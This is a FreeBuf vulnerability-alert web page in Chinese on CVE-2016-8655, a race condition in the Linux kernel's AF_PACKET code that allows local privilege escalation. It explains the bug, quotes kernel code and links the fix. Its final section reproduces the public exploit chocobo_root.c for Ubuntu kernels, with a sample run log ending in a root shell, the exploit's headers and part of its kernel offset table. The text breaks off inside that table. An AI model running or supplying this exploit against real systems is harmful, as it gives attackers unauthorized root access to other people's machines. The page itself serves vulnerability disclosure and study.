<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!--
                              _.._        ,------------.
                           ,'      `.    ( We want you! )
                          /  __) __` \    `-,----------'
                         (  (`-`(-')  ) _.-'
                         /)  \  = /  (
                        /'    |--' .  \
                       (  ,---|  `-.)__`
                        )(  `-.,--'   _`-.
                       '/,'          (  Uu",
                        (_       ,    `/,-' )
                        `.__,  : `-'/  /`--'
                          |     `--'  |
                          `   `-._   /
                           \        (
                           /\ .      \.  freebuf
                          / |` \     ,-\
                         /  \| .)   /   \
                        ( ,'|\    ,'     :
                        | \,`.`--"/      }
                        `,'    \  |,'    /
                       / "-._   `-/      |
                       "-.   "-.,'|     ;
                      /        _/["---'""]
                     :        /  |"-     '
                     '           |      /
                                 `      |
-->
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>
  【漏洞预警】CVE-2016-8655：Linux内核竞争条件漏洞，可致本地提权 (附PoC) - FreeBuf.COM | 关注黑客与极客</title>
<meta name="description" content="Seclists.org最新披露了Linux的竞争条件漏洞，漏洞编号为CVE-2016-8655。此漏洞可用于从低权限进程中执行内核代码。
漏洞编号
CVE-2016-8655
漏洞概述


Philip Pettersson在Linux (net/packet/af_packet.c)发现条…" />
<meta name="keywords" content="CVE-2016-8655, linux, 提权, 竞争条件" />
<meta name="baidu-site-verification" content="nKKKqQxp6R" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="renderer" content="webkit">
<meta property="qc:admins" content="6620477777662552566375" />
<link rel='stylesheet' id='wpfp-css' href='http://www.freebuf.com/buf/plugins/wp-favorite-posts/wpfp.css' type='text/css' />
<link rel='stylesheet' id='wp-recentcomments-css'  href='http://static.3001.net/css/recentcomments/wp-recentcomments.css?ver=2.2.3' type='text/css' media='screen' />
<link rel='stylesheet' id='mycred-widget-css'  href='http://www.freebuf.com/buf/plugins/gold/assets/css/widget.css?ver=1.3.2.1' type='text/css' media='all' />
<script type='text/javascript' src='http://static.3001.net/js/header/jquery.min.js?ver=3.6.1'></script>
<script type='text/javascript' src='http://www.freebuf.com/buf/plugins/wp-favorite-posts/wpfp.js?ver=3.6.1'></script>
<link rel='prev' title='如何用极路由+OpenWrt+RTL电视棒搭建一台SDR服务器，并隐秘地捕获和传输数据' href='http://www.freebuf.com/articles/wireless/121961.html' />
<link rel='next' title='年末了，盘点2016年最严重的7起DDoS攻击事件' href='http://www.freebuf.com/special/121838.html' />
<link rel='canonical' href='http://www.freebuf.com/vuls/122152.html' />
<link rel='shortlink' href='http://www.freebuf.com/?p=122152' />

<link rel="stylesheet" href="http://static.3001.net/css/highslide/highslide.css" type="text/css" />
<script type="text/javascript" src="http://static.3001.net/js/highslide/highslide-with-html.packed.js"></script>
<script type="text/javascript">
jQuery(document).ready(function($) {
    hs.graphicsDir = "http://www.freebuf.com/buf/plugins/auto-highslide/images/graphics/";
    hs.outlineType = "rounded-white";
    hs.dimmingOpacity = 0.8;
    hs.outlineWhileAnimating = true;
    hs.showCredits = false;
    hs.captionEval = "this.thumb.alt";
    hs.numberPosition = "caption";
    hs.align = "center";
    hs.transitions = ["expand", "crossfade"];
    hs.addSlideshow({
        interval: 5000,
        repeat: true,
        useControls: true,
        fixedControls: "fit",
        overlayOptions: {
            opacity: 0.75,
            position: "bottom center",
            hideOnMouseOut: true

        }

    });
});
</script>
          <script language="JavaScript" type="text/javascript" src="http://www.freebuf.com/buf/plugins/cartpauj-pm/js/script.js"></script>
      <link rel="stylesheet" type="text/css" href="http://www.freebuf.com/buf/plugins/cartpauj-pm/style/style.css" />
      <script type="text/javascript" src="http://www.freebuf.com/buf/plugins/simditor/highlight/highlight.pack.js"></script><link type="text/css" rel="stylesheet" href=" http://www.freebuf.com/buf/plugins/simditor/highlight/styles/default.css" />	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
<link rel="shortcut icon" href="http://static.freebuf.com/images/favicon.ico" />
<link rel="stylesheet" href="http://static.3001.net/css/new/header.css" />
<link href="http://static.3001.net/css/new/bootstrap.min.css?ver=2016051701" rel="stylesheet" media="screen">
<link href="http://static.3001.net/css/new/style.css?ver=2016051701" rel="stylesheet" type="text/css">
<style type="text/css">
#contenttxt hr {
  display: block;
  height: 0px;
  border: 0;
  border-top: 1px solid #ccc;
  margin: 15px 0;
  padding: 0;
}
#contenttxt table {
  width: 100%;
  table-layout: fixed;
  border-collapse: collapse;
  border-spacing: 0;
  margin: 15px 0;
}
#contenttxt table thead {
  background-color: #f9f9f9;
}
#contenttxt table td, #contenttxt table th {
  min-width: 40px;
  height: 30px;
  border: 1px solid #ccc;
  vertical-align: top;
  padding: 2px 4px;
  text-align: left;
  box-sizing: border-box;
  white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word;
}
#contenttxt table td.active, #contenttxt table th.active {
  background-color: #ffffee;
  white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word;
}
</style>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/jquery-2.0.3.min.js"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/bootstrap.min.js"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/slider.js?2016022501.1" type="text/javascript"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/jquery.sticky.js" type="text/javascript"></script>
<script src="http://static.3001.net/js/focus/bjqs-1.3.min.js" type="text/javascript" ></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/mosaic.1.0.1.min.js" type="text/javascript" ></script>
<!--[if lt IE 9]>
    <script src="http://www.freebuf.com/buf/themes/freebuf/js/html5shiv.min.js"></script>
    <script src="http://www.freebuf.com/buf/themes/freebuf/js/respond.min.js"></script>
<![endif]-->
    <style>
        @font-face {font-family: 'iconfont';
            src: url('http://static.3001.net/iconfont/iconfont.eot'); /* IE9*/
            src: url('http://static.3001.net/iconfont/iconfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
            url('http://static.3001.net/iconfont/iconfont.woff') format('woff'), /* chrome、firefox */
            url('http://static.3001.net/iconfont/iconfonticonfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
            url('http://static.3001.net/iconfont/iconfont.svg#iconfont') format('svg'); /* iOS 4.1- */
        }
    </style>
</head>

<body>
<!----------header---------->
<!--头部导航-->
<div id="undefined-sticky-wrapper" class="sticky-wrapper is-sticky">
    <div class="main-header">
        <div class="header">
            <div class="header-container clearfix">
                <div class="header-logo"><a href="http://www.freebuf.com"></a></div>
                <div class="nav">
                    <ul class="nav-child clearfix">
                        <li class=" index"><a href="http://www.freebuf.com">首页</a></li>
                        <li class="read-classify">
                            <a href="#">分类阅读<b class="triangle-down triangle-down-04"></b></a>
                            <ul class="dropdown-menu">
                                <li>
                                    <strong>黑客</strong>
                                    <div class="nav-item">
                                        <a href="http://www.freebuf.com/vuls" target="_blank">漏洞</a>
                                        <a href="http://www.freebuf.com/sectool" target="_blank">安全工具</a>
                                        <a href="http://www.freebuf.com/articles/web" target="_blank">WEB安全</a>
                                        <a href="http://www.freebuf.com/articles/system" target="_blank">系统安全</a>
                                        <a href="http://www.freebuf.com/articles/network" target="_blank">网络安全</a>
                                        <a href="http://www.freebuf.com/articles/wireless" target="_blank">无线安全</a>
                                        <a href="http://www.freebuf.com/articles/terminal" target="_blank">设备/客户端安全</a>
                                        <a href="http://www.freebuf.com/articles/database" target="_blank">数据库安全</a>
                                        <a href="http://www.freebuf.com/articles/security-management" target="_blank">安全管理</a>
                                    </div>
                                </li>
                                <li>
                                    <strong>极客</strong>
                                    <div class="nav-item">
                                        <a href="http://www.freebuf.com/geek" target="_blank">极客有意思</a>
                                        <a href="http://www.freebuf.com/news/others" target="_blank">周边</a>
                                    </div>
                                </li>
                                <li>
                                    <strong>特色</strong>
                                    <div class="nav-item"><a href="http://www.freebuf.com/news/special" target="_blank">头条</a><a href="http://www.freebuf.com/articles/people" target="_blank">人物志</a><a href="http://www.freebuf.com/fevents" target="_blank">活动</a><a href="http://www.freebuf.com/video" target="_blank">视频</a><a href="http://www.freebuf.com/articles/neopoints" target="_blank">观点</a><a href="http://www.freebuf.com/jobs" target="_blank">招聘</a><a href="http://www.freebuf.com/paper/" target="_blank">报告</a></div>
                                </li>
                            </ul>
                        </li>
                        <li ><a href="http://www.freebuf.com/wenku" target="_blank">文库</a><b class="icon-betr"></b></li>
                        <li><a href="http://fit.freebuf.com/" target="_blank">FIT大会</a><b class="icon-hot"></b></li>
                        <li><a href="http://bar.freebuf.com/" target="_blank">小酒馆</a></li>
                        <li><a href="http://open.freebuf.com" target="_blank">公开课</a></li>
                        <li><a href="http://shop.freebuf.com" target="_blank">商城</a></li>
                        <li><a href="https://www.vulbox.com" target="_blank">漏洞盒子</a></li>
                    </ul>
                </div>
                <div class="header-right">
                                    <div class="loginSign login-before">
                        <a href="https://account.tophant.com/register.html" class="login-btn">注册</a>
                        |
                        <a href="http://www.freebuf.com/oauth" class="sign-btn">登录</a>
                    </div>
                                    <div class="btn-publish">
                        <a href="#">投稿</a>
                        <div class="btn-publish-child">
                            <ul class="btn-child clearfix">
                                <li><a href="http://my.freebuf.com/post/edit/" target="_blank">文章撰写</a></li>
                                <li><hr/></li>
                                <li><a href="http://my.freebuf.com/post/article/" target="_blank">投稿管理</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="nav-small">
                    <a href="#">&#xe634;</a>
                    <ul class="nav-child clearfix">
                        <li class=" index"><a href="http://www.freebuf.com">首页</a></li>
                        <li class="read-classify">
                            <a href="#">分类阅读<b class="triangle-down triangle-down-04"></b></a>
                            <ul class="dropdown-menu">
                                <li>
                                    <strong>黑客</strong>
                                    <div class="nav-item">
                                        <a href="http://www.freebuf.com/vuls" target="_blank">漏洞</a>
                                        <a href="http://www.freebuf.com/sectool" target="_blank">安全工具</a>
                                        <a href="http://www.freebuf.com/articles/web" target="_blank">WEB安全</a>
                                        <a href="http://www.freebuf.com/articles/system" target="_blank">系统安全</a>
                                        <a href="http://www.freebuf.com/articles/network" target="_blank">网络安全</a>
                                        <a href="http://www.freebuf.com/articles/wireless" target="_blank">无线安全</a>
                                        <a href="http://www.freebuf.com/articles/terminal" target="_blank">设备/客户端安全</a>
                                        <a href="http://www.freebuf.com/articles/database" target="_blank">数据库安全</a>
                                        <a href="http://www.freebuf.com/articles/security-management" target="_blank">安全管理</a>
                                    </div>
                                </li>
                                <li>
                                    <strong>极客</strong>
                                    <div class="nav-item">
                                        <a href="http://www.freebuf.com/geek" target="_blank">极客有意思</a>
                                        <a href="http://www.freebuf.com/news/others" target="_blank">周边</a>
                                    </div>
                                </li>
                                <li>
                                    <strong>特色</strong>
                                    <div class="nav-item">
                                        <a href="http://www.freebuf.com/news/special" target="_blank">头条</a>
                                        <a href="http://www.freebuf.com/articles/people" target="_blank">人物志</a>
                                        <a href="http://www.freebuf.com/fevents" target="_blank">活动</a>
                                        <a href="http://www.freebuf.com/video" target="_blank">视频</a>
                                        <a href="http://www.freebuf.com/articles/neopoints" target="_blank">观点</a>
                                        <a href="http://www.freebuf.com/jobs" target="_blank">招聘</a>
                                        <a href="http://www.freebuf.com/paper/" target="_blank">报告</a>
                                    </div>
                                </li>
                            </ul>
                        </li>
                        <li ><a href="http://www.freebuf.com/wenku" target="_blank">文库</a></li>
                        <li><a href="http://fit.freebuf.com/" target="_blank">FIT大会</a></li>
                        <li><a href="http://bar.freebuf.com/" target="_blank">小酒馆</a></li>
                        <li><a href="http://open.freebuf.com" target="_blank">公开课</a></li>
                        <li><a href="http://shop.freebuf.com" target="_blank">商城</a></li>
                        <li><a href="https://www.vulbox.com" target="_blank">漏洞盒子</a></li>
                        <li><a href="http://my.freebuf.com/post/edit" target="_blank">投稿</a></li>
                                                    <li><a href="https://account.tophant.com/register.html" class="login-btn">注册</a></li>
                            <li><a href="http://www.freebuf.com/oauth" class="sign-btn">登录</a></li>
                                            </ul>
                </div>
            </div>
        </div>
    </div>
</div>
<!----------header end---------->
<script type="application/javascript">
    $(function(){
        //头部投稿按钮hover状态展开菜单
        $(".btn-publish-child > ul > li").hover(function(){
            $(this).addClass("active");
            $(this).siblings().removeClass("active");
        });

        $(document).click(function(event){
            var ev = ev || event;
            $(".login-after").find(".login-after-child").hide();
            $(".read-classify").find(".dropdown-menu").hide();
        });
        //点击用户信息，出现下拉菜单
        $("#user-info").click(function(event){
            var ev = ev || event;
            ev.stopPropagation();
            $(".login-after").find(".login-after-child").toggle();
        });
        //分类阅读下拉菜单
        $(".read-classify").click(function(event){
            var ev = ev || event;
            ev.stopPropagation();
            $(this).find(".dropdown-menu").toggle();
        });
        //分类阅读hover状态
        $(".read-classify").hover(function(){
            $(this).find("a > b").addClass("triangle-down-w");
        },function(){
            $(this).find("a > b").removeClass("triangle-down-w");
        });
        //顶部导航
        $(".nav-small").click(function(){
            $(this).find(".nav-child").slideToggle();
        });
    });

</script><script>
    jQuery(window).load(function(){
      if(jQuery(window).width()>480){
        jQuery(".main-header").sticky({ topSpacing: 0 });
      }else{
        jQuery(".main-header nav").removeClass("navbar-fixed-top");
      }
      jQuery("#mar-right").sticky({ topSpacing: 105,bottomSpacing: 410 });
    });
</script>
<script type="text/javascript" src="http://static.3001.net/js/pretty/prettify.js"></script>
<script type="text/javascript" src="http://static.3001.net/js/header/lazyload.js"></script>
<script type="text/javascript" charset="utf-8">
      jQuery(function() {
          jQuery("img").lazyload({
              effect : "fadeIn"
          });
      });
 </script>
<script type="text/javascript">
    window.onload = function(){
        prettyPrint();
    }
</script>
<script language="JavaScript" type="text/javascript">
//<![CDATA[
var va = "您已经点亮过了";
function acv_vote(id,option, m){
  if( m==null) m =''; m = m + '';
  jQuery('#acv_stat_'+m+id).html('Loading...');
  var url="http://www.freebuf.com/index.php?acv_ajax=true&option="+option+"&ID="+id;
  jQuery.get(url,function(d){
    d =d.split('|');var s='#acv_stat_'+m+d[0];
    var sele = '#cos_support-'+m+id,unsele = '#cos_unsupport-'+m+id,tpjs = 'javascript:alert(va)';
    jQuery( s ).html( d[1] );jQuery(s).fadeOut(400,function(){jQuery(s).fadeIn();});
    if( d[2] == 1 ){ jQuery(sele).html(jQuery(sele).html()*1+1); }
    if( d[2] == -1 ){ jQuery(unsele).html(jQuery(unsele).html()*1+1); }
    jQuery('#vote4-'+id).attr('href',tpjs);jQuery('#vote4-2'+id).attr('href',tpjs);
    jQuery('#votea-'+id).attr('href',tpjs);jQuery('#votea-2'+id).attr('href',tpjs);
  });
}
  
$(document).on("mouseenter",".comment-tools",function(){
  $(this).find(".btn-report").show();
  $(this).find(".btn-report").addClass("hover");
}).on("mouseleave",".comment-tools",function(){
  var $_this = $(this);
  $(this).find(".btn-report").removeClass("hover");
  if(!$(this).find(".dropup").hasClass('open')){
    $(this).find(".btn-report").hide(); 
    $_this.find(".dropdown-menu").css("display","none");
  }else{
    setTimeout(function(){
      if(!$_this.find(".btn-report").hasClass("hover")){
        $_this.find(".dropup").removeClass("open");
        $_this.find(".dropdown-menu").css("display","none");
        $_this.find(".btn-report").hide(); 
      }
    },"500");
  }
})

$(document).on("click",".click_report",function(){
  $(this).parent().parent().css("display","none");
  var id = $(this).attr("data-id");
  var url="http://www.freebuf.com/index.php?acv_ajax=true&option=0&ID="+id;
  $_this = $(this);
  jQuery.get(url,function(d){
    d =d.split('|');
    if(d[1]=='您已经点过灯了'){
      d[1] = '您已经举报过了';
    }
    if(d[1]=='Thank you'){
      d[1] = '举报成功';
    }
    $_this.parent().parent().parent().find(".btn-report").text(d[1]);
    $_this.parent().parent().parent().find(".btn-report").css("display","block");
  })
})

$(document).on("click",".btn-report",function(){
  if($(this).parent().hasClass('open')){
    $(this).parent().find(".dropdown-menu").css("display","block");
  }else{
    $(this).parent().find(".dropdown-menu").css("display","none");
  }
})
//]]>
</script>
<div class="container pad-top35">
  <div class="row clearfix">
        <div class="col-md-9" id="getWidth">
      <div class="article-wrap panel panel-default">
                    <div class="articlecontent">
        <div class="title">
          <h2> 【漏洞预警】CVE-2016-8655：Linux内核竞争条件漏洞，可致本地提权 (附PoC) </h2>
          <div class="property">
		  		  <span class="name"><a href="http://www.freebuf.com/author/%e6%bc%8f%e6%b4%9e%e7%9b%92%e5%ad%90" title="由 漏洞盒子 发布" rel="author">漏洞盒子</a></span>
		  		  <span class="icon-f"><a href="http://www.freebuf.com/bufer" target="_blank"><img src="http://image.3001.net/images/index/f2.png" title="认证厂商"></a></span>
		  <span class="time">2016-12-07</span>
             
		  <span class="look">共<strong>141633</strong>人围观
              ，发现 <strong>21</strong> 个不明物体 </span>          </span>
		  <span class="tags">		  
		  <a href="http://www.freebuf.com/./vuls">漏洞</a></span>	
        <span class="tags_01"></span>			  
		  </div>
        </div>
                        <div id="contenttxt">
           <p><b style="color: rgb(0, 176, 80);">Seclists.org最新披露了Linux的竞争条件漏洞，漏洞编号为CVE-2016-8655。此漏洞可用于从低权限进程中执行内核代码。</b></p>
<h2>漏洞编号</h2>
<p>CVE-2016-8655</p>
<h2>漏洞概述</h2>
<p style="text-align: center;"><img alt="F173C354-A8A9-4C85-823B-2621CCB8269A.png" data-original="http://image.3001.net/images/20161208/14811678965445.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="690" height="622"></p>
<noscript><img alt="F173C354-A8A9-4C85-823B-2621CCB8269A.png" src="http://image.3001.net/images/20161208/14811678965445.png!small" width="690" height="622"></p></noscript>
<p>Philip Pettersson在Linux (net/packet/af_packet.c)发现条件竞争漏洞，此漏洞可用于从未授权进程中执行内核代码。攻击者只需要本地低权限，就能利用该漏洞致拒绝服务（系统崩溃）或者以管理员权限执行任意代码</p>
<p>packet_set_ring在创建ring buffer的时候，如果packet版本为TPACKET_V3，则会初始化struct timer_list。在packet_set_ring完成之前，其他线程可调用setsockopt将packet版本设定为TPACKET_V1。此时先前初始化的timer不会被删除，也就形成了套接字关闭时struct timer_list中函数指针的user after free漏洞。</p>
<p>这个BUG最早出现于2011年4月19号的代码中，详细参考：</p>
<p><a href="https://github.com/torvalds/linux/commit/f6fb8f100b807378fda19e83e5ac6828b638603a" target="_self">https://github.com/torvalds/linux/commit/f6fb8f100b807378fda19e83e5ac6828b638603a</a></p>
<p>该BUG已经于2016年11月30号被修复，详细参考：</p>
<p><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=84ac7260236a49c79eede91617700174c2c19b0c" target="_self">https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=84ac7260236a49c79eede91617700174c2c19b0c</a></p>
<h2>漏洞细节</h2>
<p>要创建AF-PACKET套接字，在网络命名空间中就需要CAP_NET_RAW。在低权限命名空间可用的系统中（Ubuntu、Fedora等），这可以通过未授权进程获取。这个漏洞在容器中即可触发，最终攻陷主机内核。在Android系统中，带gid=3004/AID_NET_RAW的进程可创建AF_PACKET套接字，并触发该BUG。</p>
<p>问题主要出在packet_set_ring()和packet_setsockopt()中。使用PACKET_RX_RING选项在socket中调用setsockopt()，就能搞定packet_set_ring()。</p>
<p>如果packet套接字版本为TPCKET_V3，调用init_prb_bdqc()的时候，packet_set_ring()就会对timer_list对象进行初始化。</p>
</p>
<pre><code><p>...</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; switch (po-&gt;tp_version) {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; case TPACKET_V3:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* Transmit path is not supported. We checked</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* it above but just being paranoid</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (!tx_ring)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; init_prb_bdqc(po, rb, pg_vec, req_u);</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; default:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</p><p>...</p></code></pre>
</p>
<p>创建timer的函数流为：</p>
</p>
<pre><code><p>packet_set_ring()-&gt;init_prb_bdqc()-&gt;prb_setup_retire_blk_timer()-&gt;</p><p>prb_init_blk_timer()-&gt;prb_init_blk_timer()-&gt;init_timer()</p></code></pre>
</p>
<p>该套接字关闭时，packet_set_ring()会再度被调用，来释放ring buffer，并删除先前初始化的timer（当packet版本大于TPACKET_V2时）：</p>
</p>
<pre><code><p>...</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if (closing &amp;&amp; (po-&gt;tp_version &gt; TPACKET_V2)) {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* Because we don't support block-based V3 on tx-ring */</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (!tx_ring)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; prb_shutdown_retire_blk_timer(po, rb_queue);</p><p>&nbsp; &nbsp; &nbsp; &nbsp; }</p><p>...</p></code></pre>
</p>
<p>此处的问题就出在，在init_prb_bdqc()执行之后，packet_set_ring()返回之前，我们可以将packet版本改为TPACKET_V1。</p>
<p>不过ring buffer被初始化之后，会存在拒绝修改套接字版本的情况，但这也根本不是什么问题：</p>
</p>
<pre><code><p>...</p><p>&nbsp; &nbsp; &nbsp; &nbsp; case PACKET_VERSION:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; {</p><p>...</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (po-&gt;rx_ring.pg_vec || po-&gt;tx_ring.pg_vec)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return -EBUSY;</p><p>...</p></code></pre>
</p>
<p>在init_prb_bdqc()和packet_set_ring()的交换（rb-&gt;pg_vec, pg_vec）调用之间，还是有足够的空间来搞定这条代码路径。</p>
<p>此时，套接字关闭时，由于套接字版本已经为TPACKET_V1，packet_set_ring()就不会删除timer。描绘timer对象的struct timer_list位于struct packet_sock中，调用kfree()就会释放。</p>
<p>随后timer对象之上就形成了use after free漏洞，可被各种针对SLAB分配器的攻击利用。最终timer过期后，就可导致内核跳转至构建的函数指针。</p>
<p>在packet_setsockopt()中用lock_sock(sk)，同时在packet_set_ring()起始就锁定packet版本即可解决问题。</p>
<p>新版Ubuntu内核已经放出，用户升级至新版Ubuntu即可解决问题。</p>
<h2>漏洞PoC</h2>
<p>按照发现该漏洞的作者Philip Pettersson所说，漏洞PoC会在明天放出&#8230;</p>
<p>PoC地址：<a href="https://www.exploit-db.com/exploits/40871/" target="_blank">https://www.exploit-db.com/exploits/40871/</a></p>
<pre><code>/*
chocobo_root.c
linux AF_PACKET race condition exploit
exploit for Ubuntu 16.04 x86_64

vroom vroom
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=
user@ubuntu:~$ uname -a
Linux ubuntu 4.4.0-51-generic #72-Ubuntu SMP Thu Nov 24 18:29:54 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
user@ubuntu:~$ id
uid=1000(user) gid=1000(user) groups=1000(user)
user@ubuntu:~$ gcc chocobo_root.c -o chocobo_root -lpthread
user@ubuntu:~$ ./chocobo_root
linux AF_PACKET race condition exploit by rebel
kernel version: 4.4.0-51-generic #72
proc_dostring = 0xffffffff81088090
modprobe_path = 0xffffffff81e48f80
register_sysctl_table = 0xffffffff812879a0
set_memory_rw = 0xffffffff8106f320
exploit starting
making vsyscall page writable..

new exploit attempt starting, jumping to 0xffffffff8106f320, arg=0xffffffffff600000
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 174222, last val = 2)
current packet version = 0
pbd-&gt;hdr.bh1.offset_to_first_pkt = 48
*=*=*=* TPACKET_V1 &amp;&amp; offset_to_first_pkt != 0, race won *=*=*=*
please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.
closing socket and verifying.......
vsyscall page altered!


stage 1 completed
registering new sysctl..

new exploit attempt starting, jumping to 0xffffffff812879a0, arg=0xffffffffff600850
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 30773, last val = 0)
current packet version = 2
pbd-&gt;hdr.bh1.offset_to_first_pkt = 48
race not won

retrying stage..
new exploit attempt starting, jumping to 0xffffffff812879a0, arg=0xffffffffff600850
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 133577, last val = 2)
current packet version = 0
pbd-&gt;hdr.bh1.offset_to_first_pkt = 48
*=*=*=* TPACKET_V1 &amp;&amp; offset_to_first_pkt != 0, race won *=*=*=*
please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.
closing socket and verifying.......
sysctl added!

stage 2 completed
binary executed by kernel, launching rootshell
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root),1000(user)

*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=

There are offsets included for older kernels, but they're untested
so be aware that this exploit will probably crash kernels older than 4.4.

tested on:
Ubuntu 16.04: 4.4.0-51-generic
Ubuntu 16.04: 4.4.0-47-generic
Ubuntu 16.04: 4.4.0-36-generic
Ubuntu 14.04: 4.4.0-47-generic #68~14.04.1-Ubuntu

Shoutouts to:
jsc for inspiration (https://www.youtube.com/watch?v=x4UDIfcYMKI)
mcdelivery for delivering hotcakes and coffee

11/2016
by rebel
*/

#define _GNU_SOURCE
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;assert.h&gt;
#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;poll.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;netinet/if_ether.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;linux/if_packet.h&gt;
#include &lt;pthread.h&gt;
#include &lt;linux/sched.h&gt;
#include &lt;netinet/tcp.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;signal.h&gt;
#include &lt;sched.h&gt;
#include &lt;sys/utsname.h&gt;

volatile int barrier = 1;
volatile int vers_switcher_done = 0;

struct offset {
    char *kernel_version;
    unsigned long proc_dostring;
    unsigned long modprobe_path;
    unsigned long register_sysctl_table;
    unsigned long set_memory_rw;
};


struct offset *off = NULL;

//99% of these offsets haven't actually been tested <img data-original="http://image.3001.net/images/index/smilies/icon_smile.gif" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=':)' class='wp-smiley' />
<noscript><img src='http://image.3001.net/images/index/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></noscript> 

struct offset offsets[] = {
    {"4.4.0-46-generic #67~14.04.1",0xffffffff810842f0,0xffffffff81e4b100,0xffffffff81274580,0xffffffff8106b880},
    {"4.4.0-47-generic #68~14.04.1",0,0,0,0},
    {"4.2.0-41-generic #48",0xffffffff81083470,0xffffffff81e48920,0xffffffff812775c0,0xffffffff8106c680},
    {"4.8.0-22-generic #24",0xffffffff8108ab70,0xffffffff81e47880,0xffffffff812b34b0,0xffffffff8106f0d0},
    {"4.2.0-34-generic #39",0xffffffff81082080,0xffffffff81c487e0,0xffffffff81274490,0xffffffff8106b5d0},
    {"4.2.0-30-generic #36",0xffffffff810820d0,0xffffffff81c487e0,0xffffffff812744e0,0xffffffff8106b620},
    {"4.2.0-16-generic #19",0xffffffff81081ac0,0xffffffff81c48680,0xffffffff812738f0,0xffffffff8106b110},
    {"4.2.0-17-generic #21",0,0,0,0},
    {"4.2.0-18-generic #22",0,0,0,0},
    {"4.2.0-19-generic #23~14.04.1",0xffffffff8107d640,0xffffffff81c497c0,0xffffffff8125de30,0xffffffff81067750},
    {"4.2.0-21-generic #25~14.04.1",0,0,0,0},
    {"4.2.0-30-generic #36~14.04.1",0xffffffff8107da40,0xffffffff81c4a8e0,0xffffffff8125dd40,0xffffffff81067b20},
    {"4.2.0-27-generic #32~14.04.1",0xffffffff8107dbe0,0xffffffff81c498c0,0xffffffff8125e420,0xffffffff81067c60},
    {"4.2.0-36-generic #42",0xffffffff81083430,0xffffffff81e488e0,0xffffffff81277380,0xffffffff8106c680},
